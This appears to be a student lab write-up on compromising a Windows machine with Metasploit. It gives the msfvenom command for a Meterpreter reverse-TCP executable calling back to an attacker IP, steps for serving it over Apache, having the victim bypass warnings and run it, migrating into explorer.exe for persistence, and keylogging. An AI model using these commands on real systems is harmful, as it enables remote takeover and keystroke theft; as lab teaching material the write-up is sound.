# Compromising-windows-using-Metasploit

## AIM:

To Compromise windows using Metasploit 

## DESIGN STEPS:

1) Install kali linux either in partition or virtual box or in live mode

2) Investigate on the various categories of tools as follows:

3) Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

### PROGRAMS:

Find the attackers ip address using ifconfig

#### OUTPUT:
![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/652db2a7-41fe-4f0b-9d6a-bafd45358c66)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

#### OUTPUT:

![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/8a94c14f-93c4-44c0-9307-09d091275f2a)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/00951cdd-6e72-425a-a7d3-3861205e75a1)

Start apache server sudo systemctl apache2 start

![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/ab5917bc-b667-43e6-8569-afac549df4de)

Check the status of apache2

![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/2b2a7279-1968-4f7b-ac9d-25a6fbd9d8f8)

### Invoke msfconsole:'

#### OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler


![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/f81fb9a9-568e-48de-a97d-224f14916b52)

set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/8905bab0-5573-4be1-82ca-a6a510ed478f)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/3b376e36-9001-421e-9301-ffb999a638f1)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/89123af1-f1c2-4cfb-a5a8-c24bdc714336)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/d3eab66d-7142-4366-ac4d-d2644fc02717)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/6b83ef4d-6410-45d3-a6ae-f63b3b13c953)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/Monisha-11/Compromising-windows-using-Metasploit/assets/93427240/2ee279ad-7ce2-426b-960c-a92a0c067e8a)





## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
